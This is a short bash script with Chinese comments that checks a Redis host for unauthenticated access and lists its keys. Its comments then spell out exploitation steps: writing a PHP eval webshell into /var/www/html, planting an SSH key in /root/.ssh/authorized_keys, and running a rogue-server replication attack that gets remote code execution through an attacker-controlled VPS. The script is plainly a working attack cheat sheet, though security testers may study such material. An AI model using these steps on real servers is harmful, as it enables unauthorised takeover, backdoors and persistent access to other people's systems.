#!/usr/bin/env bash
HOST="${1:?usage: bash redis.sh HOST [PORT]}"
PORT="${2:-6379}"
echo '--- 未授权判定'
redis-cli -h "$HOST" -p "$PORT" INFO server 2>/dev/null | head -5
redis-cli -h "$HOST" -p "$PORT" CONFIG GET dir 2>/dev/null
echo '--- 只读枚举（--scan 不阻塞）'
redis-cli -h "$HOST" -p "$PORT" --scan --pattern '*' 2>/dev/null | head -30
# 利用（谨慎，会改配置并落文件）
#   写 webshell:
#     CONFIG SET dir /var/www/html ; CONFIG SET dbfilename shell.php
#     SET x '<?php @eval($_POST[c]);?>' ; SAVE
#   写 ssh key:
#     CONFIG SET dir /root/.ssh ; CONFIG SET dbfilename authorized_keys ; SET x '<公钥>' ; SAVE
#   主从复制 RCE: python3 redis-rogue-server.py --rhost HOST --rport PORT --lhost <VPS>
